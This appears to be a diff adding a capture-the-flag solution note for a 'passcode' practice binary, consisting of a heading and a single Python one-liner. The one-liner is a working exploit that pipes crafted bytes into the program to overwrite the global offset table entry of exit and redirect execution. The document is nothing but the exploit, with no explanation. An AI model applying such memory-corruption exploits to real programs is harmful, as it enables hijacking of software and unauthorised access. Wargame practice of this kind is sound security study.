@@ -1,0 +1,3 @@
+###Hijack .got of exit
+
+python -c "print('a'*96+chr(0x18)+chr(0xa0)+chr(0x04)+chr(0x08)+str(0x80485e3))" | ./passcode
